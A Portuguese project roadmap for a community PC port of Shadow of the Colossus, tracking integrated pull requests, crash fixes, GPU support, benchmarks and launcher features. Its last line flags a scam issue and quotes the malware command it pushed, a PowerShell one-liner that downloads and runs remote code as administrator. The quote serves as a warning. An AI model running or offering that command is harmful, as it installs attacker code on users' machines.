# Roadmap — Shadow of the Colossus PC

Atualizado a cada correção. Legenda: ✅ feito · 🔧 em andamento · ⏳ pendente

**Estratégia (19/10/2026):** integrar e testar as pull requests e forks da comunidade em vez de refazer
o trabalho. Branch local `comunidade` = `main` (0.57) + PRs integradas. As correções equivalentes que
fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em hardware que não temos).

## Fase 0 — Integração da comunidade

| # | Item | Estado | Notas |
|---|---|---|---|
| 0.1 | PRs pequenas do Lucas-blip-png: #46, #47, #52, #53, #106, #108 | ✅ | #48, #105 e #107 já cobertas pela #98. #47 com conflito resolvido (RTZ na NVIDIA + pacote tipo 2). |
| 0.2 | #98 (Gabriell-os): AMD + #32 + #59 + #83 (Oussama268) | ✅ | Wave64 uniforme na AMD, blocos de 64 MiB na arena, fila de avisos que cresce, cache de formatos, readbacks assíncronos etc. |
| 0.3 | #103 (Oussama268): cortes no processador de comandos, liberação de VRAM fria | ✅ | `00fe449`. Conflito com a #98 na arena: mantidos os blocos de 64 MiB; a liberação passou a ser por trecho residente (com releitura e comparação). Teste forçado (`SOTC_ARENA_EVICT_MB=256`): 10 min, 1,5 GB liberados em 118 passadas, 0 erros, VRAM 2,7 GB (antes ~4,3). Benchmark com cache pronto: **62,6 FPS média, 30,9 mínima** (antes ~54–55 e ~26). |
| 0.4 | #81 (jownatan): Intel Arc B580 | ✅ | Só as partes exclusivas (a compilação em segundo plano e a pré-carga já vieram, para todas as GPUs, pela #83): trava de regiões sem deadlock no Windows, `SotC-Shaders.ps1`, e a espera da thread de gravação como opção `SOTC_REC_SLEEP_US` (2 ms fixos custavam 6% no desktop: 57,7 vs 61,1 FPS; notebooks/APUs: `2000`). |
| 0.5 | #69 (DUDUYG): menos CPU por draw, thread de preparação de draws | ⏳ decisão | Conflita com a linha do Oussama em 31 arquivos (~110 trechos). A medição anterior (56,9 / 41,2) **não vale**: no build da #69 o jogo pula a intro e cai num demo diferente (Wander montado, dicas de tutorial), mais leve na ponte. Mesmo demo sem DMA no `comunidade`: 61 / 26–27 (DMA não muda o pior trecho). Ganho documentado pelo autor (PC dele): preparação de draws +3,6% média / +10% trecho pesado; memos −6 a −11% de CPU por comando; parte se sobrepõe aos cortes do Oussama. |
| 0.6 | Fork xeodeo `v0.57-fixed.1`: bloco preto da AMD RDNA3/4 (#43), BC5/BC6H sem storage | ✅ | `9075c6a` (barreira entre a limpeza do swapchain e a cópia) e `ef72bdb` (só o trecho do `image.cpp`). Sem AMD aqui: só conferido que a NVIDIA segue correta. De fora: menu dentro do jogo, PGO e ícones Xbox/Nintendo (`glyphs/` feitos das texturas do jogo = material da Sony; o autor vai gerá-los localmente na próxima versão). A gravação Vulkan dormindo 2 ms já é opção (0.4). |
| 0.7 | Fork nakaionyt `v0.57-fg2` (y7ngboy): geração de quadros, sombras distantes reaproveitadas, ritmo de quadros, overlay F10, trava F7 | ✅ | Commits próprios aplicados (fora versão/README e textos fixos em inglês); conflitos resolvidos (menu + overlay, ritmo de quadros do fork no lugar do `SOTC_FLIP_LATE` da #98, `fsr-vulkan` adicionado uma vez). **FSR 3 testada na RTX 2060**: 30 quadros gerados por segundo com o jogo a 33,3 ms → 60 na tela. DLSS-G (RTX 40/50) entra no código mas precisa das DLLs oficiais da NVIDIA ao lado do exe (não baixadas; não testada). Sombras reaproveitadas: ~650–1.270 cascatas por janela, 0 recusadas, imagens corretas; FPS 62–63 (antes 61–62: aqui o limite é a CPU). Lançador: com 60 FPS desligado, trava em 30. **Teste do usuário (1 h, pacote `dist/SotC-PC-teste`): jogo bom; FSR 3 sem efeito visível com o modo 60 FPS ligado (60→120 numa tela de 60 Hz) e barra de vida/stamina tremendo (a interpolação inclui a HUD; o jogo desenha HUD e cena juntos).** Geração de quadros fica desligada por padrão e marcada como experimental no lançador (`766cbcf`). |
| 0.8 | Demais PRs (#94 menu, #54 widescreen, #118 F11, #130/#39 Linux, #99/#132 refatoração grande do CP) | ⏳ | Avaliar uma a uma. |
| 0.9 | Corrigir autor dos commits 1bb9dd5/83f88ff (branch `ajncsystem-estabilidade-fps`, PR #93) | ⏳ | |

## Fase 1 — Estabilidade (quedas e travamentos)

| # | Item | Estado | Notas |
|---|---|---|---|
| 1 | Jogo congela ("STOP: GPU hook queue overflow") | ✅ | Na #98 (Gabriell-os `3394cd0`); eu tinha feito igual (`c69befb`, branch `sotc`). |
| 2 | Limite de alocações de VRAM (`EnsureResident: Assertion Failed`, AMD) | ✅ | Na #98 (blocos de 64 MiB, `9563b7d`); igual ao meu `c69befb`. |
| 3 | Liberar VRAM sem uso (placas de 4–6 GB) | ✅ | Da #103, adaptada aos blocos (0.3). Meu `1b62560` fica de fora: não comparava a arena com a memória do jogo antes de liberar (risco de cenas apagadas, achado do Oussama). |
| 4 | Fault 0x1a371 no modo PS4 Pro (após 1º/2º colosso) | ✅ | PR #106 (+640 MiB no modo Pro); mesma conclusão que a minha (`c2614b0`/`7d9ee11`). |
| 4b | Streaming de texturas desligado sem querer desde a v0.0.13 | ⏳ | `sotc_lod_stats.h`: `idle < linger` com `linger = 0` nunca é verdadeiro. Com `<=`: 10+15 min normal e 7,5 min Pro sem queda; falta carregar um save com ele ligado. |
| 5 | Queda na intro final | ⏳ | Aguardando log/cena do usuário. |
| 6 | Release v0.58 | ✅ | **Publicada em 19/10** (tag `v0.58` = `0ac9252`, SotC-PC.zip 84 MB, Latest). Releases públicas: 0.58, 0.57, 0.56. O rascunho antigo 0.58-rc1 (AMD preview, não público) ficou. |

## Fase 2 — Modo 60 FPS

| # | Item | Estado | Notas |
|---|---|---|---|
| 7 | Física/tempo no dobro: parede do 2º colosso (#120), colossos voando (#100), queda na ponte (#63) | 🔧 | Alternativa pronta (0.7): jogo a 30 + geração de quadros = 60 na tela sem mexer na física. O modo 60 FPS nativo continua com os defeitos. |

## Fase 3 — AMD e outras GPUs

| # | Item | Estado | Notas |
|---|---|---|---|
| 8 | AMD (#122, #87, #86, #82, #43), GTX 1060/1070 (#102, #68), Intel Arc (#16) | 🔧 | #98, #81 (partes) e xeodeo integrados; falta teste em AMD/Intel reais (pedir a jogadores). GTX 10xx sem trabalho ainda. |

## Fase 4 — Desempenho

| # | Item | Estado | Notas |
|---|---|---|---|
| 9 | Processador de comandos (meta 40–60 FPS estáveis) | 🔧 | #59/#83/#103 integradas (+10% no demo); falta 0.5 (#69). |
| 10 | FPS baixo em PCs fortes (#129), templo (#14) | ⏳ | |

## Fase 5 — Extras

| # | Item | Estado | Notas |
|---|---|---|---|
| 11 | Pré-compilar shaders (#124), auto-update (#136), versão sem AVX2 (#70, #89, #88) | ⏳ | #83 já lê os caches em paralelo (50 s → 0,9 s) e compila pipelines em segundo plano. |

## Fase 6 — Lançador e janela (pedidos do usuário, 19/10)

| # | Item | Estado | Notas |
|---|---|---|---|
| 12 | Idiomas do lançador: espanhol, chinês (simplificado), coreano, russo | ✅ | `ac18022`. 224 textos por idioma em `launcher/sotc_i18n.py` (procurados pelo texto em português; o que faltar sai em inglês); fonte Microsoft YaHei UI / Malgun Gothic para chinês/coreano; conferido na tela. |
| 13 | Opção de FPS: 30 / 60 / ilimitado | ✅ | `3b433bd`. 60 = sem o limite do jogo, no máximo 1 quadro a cada 2 vblanks de 120 Hz (`SOTC_FPS_LIMIT`); demo nunca acima de 60,0. |
| 14 | Ícone do jogo na janela, versão e FPS no título | ✅ | `d7bb081`. Ícone tirado do `icon0.png` do dump do jogador (nada da Sony no pacote); título "SHADOW OF THE COLOSSUS™ · v01.01 · 60 FPS". |
| 15 | DLSS-G (RTX 40/50) no pacote | ✅ | `0ab2ff7`. Runtime oficial NVIDIA Streamline 2.14.16 (11 MB, assinaturas verificadas) + licenças em `bin/licenses-nvidia`, fora do git (`../SotC-deps`). Na RTX 2060 a DLSS-G é recusada e a FSR 3 assume. Não testada em RTX 40/50 (outros projetos já testaram numa 4080). |
| 16 | Overlay F10 e mensagens F7/F8 no idioma do lançador | ✅ | `9656fa4` (os textos do fork de geração de quadros estavam em francês). |
| 17 | Widescreen / ultrawide (16:10, 21:9, 32:9, Hor+) | ✅ | PR #54 (tabnul), `72d2a69`. Testado em 2560x1080: imagem mais larga, sem esticar, sem erros. |
| 18 | Ícones de botões Xbox no jogo (opção PlayStation / Xbox) | ✅ | Mecanismo de troca de texturas do xeodeo (`5cfd8ea`); 12 ícones desenhados do zero (`tools/make_button_icons.py`, `glyphs/xbox`): A B X Y, RB, LT/RT, LS/RS, Menu, View. Opção em Controles no lançador. Conferido no menu: B = retroceder, A = confirmar. |

| 19 | Modo PS4 Pro nos Ajustes rápidos | ✅ | `c407620`. |
| 20 | Idioma na primeira tela do lançador | ✅ | `8508a33`. Seletor 🌐 no canto da tela de boas-vindas; o lançador reabre no idioma escolhido. |
| 21 | Imagem de cada save na lista (como no PS4 / shadPS4) | ✅ | O `icon0.png` de cada save à esquerda do título, detalhes e data. |

| 22 | Tela de carregamento e barra de % dos shaders | ✅ | `2eb2f7e`. Aparece quando o jogo passa 1 s sem desenhar (boot, cache de shaders, cargas longas); barra com % enquanto o cache é lido. Com o cache pronto dura ~0,3 s; o preto que vem depois é o próprio jogo carregando os logos. |

## Fora do roteiro

- Issue #138 é golpe (malware: `iex(irm gitrm.sbs)` como admin) — apagar e denunciar a conta.
